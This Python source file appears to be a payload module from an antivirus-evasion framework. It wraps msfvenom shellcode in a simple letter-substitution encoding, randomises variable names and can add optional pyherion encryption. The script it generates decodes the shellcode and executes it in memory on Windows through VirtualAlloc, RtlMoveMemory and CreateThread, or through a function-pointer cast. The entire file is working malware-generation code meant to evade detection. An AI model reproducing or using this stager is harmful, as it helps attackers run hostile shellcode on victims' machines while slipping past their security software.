"""

Currently, this code takes normal shellcode, and replaces the letter "c" with the letter "t".  At runtime,
the executables reverses the letter substitution and executes the shellcode

Future work, randomize the letter that is being swapped

Letter substitution code was adapted from:
http://www.tutorialspoint.com/python/string_maketrans.htm
module by @christruncer

"""



from Crypto.Cipher import DES
import string

from modules.common import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import crypters
from modules.common import encryption


class Stager:
	
	def __init__(self):
		# required options
		self.shortname = "LetterSubstitution"
		self.description = "A letter used in shellcode is replaced with a different letter. At runtime, the exe reverses the letter substitution and executes the shellcode"
		self.language = "python"
		self.rating = "Excellent"
		self.extension = "py"
		
		self.shellcode = shellcode.Shellcode()
		# options we require user interaction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
						"use_pyherion" : ["N", "Use the pyherion encrypter"],
						"inject_method" : ["virtual", "Injection method, [virtual]alloc or [void]pointer"]}
	
	def generate(self):
		if self.required_options["inject_method"][0].lower() == "virtual":
		
			# Generate Shellcode Using msfvenom
			Shellcode = self.shellcode.generate()
			
			# Generate Random Variable Names
			SubbedShellcodeVariableName = randomizer.randomString()
			ShellcodeVariableName = randomizer.randomString()
			RandPtr = randomizer.randomString()
			RandBuf = randomizer.randomString()
			RandHt = randomizer.randomString()
			RandDecodedLetter = randomizer.randomString()
			RandCorrectLetter = randomizer.randomString()
			RandSubScheme = randomizer.randomString()

			# Letter Substitution Variables
			EncodeWithThis = "c"
			DecodeWithThis = "t"

			# Create Letter Substitution Scheme
			SubScheme = string.maketrans(EncodeWithThis, DecodeWithThis)

			# Escaping Shellcode
			Shellcode = Shellcode.encode("string_escape")

			# Create Payload File
			PayloadCode = 'import ctypes\n'
			PayloadCode += 'from string import maketrans\n'
			PayloadCode += RandDecodedLetter + ' = "t"\n'
			PayloadCode += RandCorrectLetter + ' = "c"\n'
			PayloadCode += RandSubScheme + ' = maketrans('+ RandDecodedLetter +', '+ RandCorrectLetter + ')\n'
			PayloadCode += SubbedShellcodeVariableName + ' = \"'+ Shellcode.translate(SubScheme) +'\"\n'
			PayloadCode += SubbedShellcodeVariableName + ' = ' + SubbedShellcodeVariableName + '.translate(' + RandSubScheme + ')\n'
			PayloadCode += ShellcodeVariableName + ' = bytearray(' + SubbedShellcodeVariableName + '.decode(\"string_escape\"))\n'
			PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
			PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
			PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
			PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
			PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

			if self.required_options["use_pyherion"][0].lower() == "y":
				PayloadCode = crypters.pyherion(PayloadCode)
			
			return PayloadCode

		else:

			# Generate Shellcode Using msfvenom
			Shellcode = self.shellcode.generate()
			
			# Generate Random Variable Names
			SubbedShellcodeVariableName = randomizer.randomString()
			ShellcodeVariableName = randomizer.randomString()
			RandPtr = randomizer.randomString()
			RandBuf = randomizer.randomString()
			RandHt = randomizer.randomString()
			RandDecodedLetter = randomizer.randomString()
			RandCorrectLetter = randomizer.randomString()
			RandSubScheme = randomizer.randomString()
			RandReverseShell = randomizer.randomString()
			RandMemoryShell = randomizer.randomString()
			RandShellcode = randomizer.randomString()

			# Letter Substitution Variables
			EncodeWithThis = "c"
			DecodeWithThis = "t"

			# Create Letter Substitution Scheme
			SubScheme = string.maketrans(EncodeWithThis, DecodeWithThis)

			# Escaping Shellcode
			Shellcode = Shellcode.encode("string_escape")

			# Create Payload File
			PayloadCode = 'from ctypes import *\n'
			PayloadCode += 'from string import maketrans\n'
			PayloadCode += RandDecodedLetter + ' = "t"\n'
			PayloadCode += RandCorrectLetter + ' = "c"\n'
			PayloadCode += RandSubScheme + ' = maketrans('+ RandDecodedLetter +', '+ RandCorrectLetter + ')\n'
			PayloadCode += SubbedShellcodeVariableName + ' = \"'+ Shellcode.translate(SubScheme) +'\"\n'
			PayloadCode += SubbedShellcodeVariableName + ' = ' + SubbedShellcodeVariableName + '.translate(' + RandSubScheme + ')\n'
			PayloadCode += SubbedShellcodeVariableName + ' = ' + SubbedShellcodeVariableName + '.decode(\"string_escape\")\n'
			PayloadCode += RandMemoryShell + ' = create_string_buffer(' + SubbedShellcodeVariableName + ', len(' + SubbedShellcodeVariableName + '))\n'
			PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
			PayloadCode += RandShellcode + '()'
    
			if self.required_options["use_pyherion"][0].lower() == "y":
				PayloadCode = crypters.pyherion(PayloadCode)

			return PayloadCode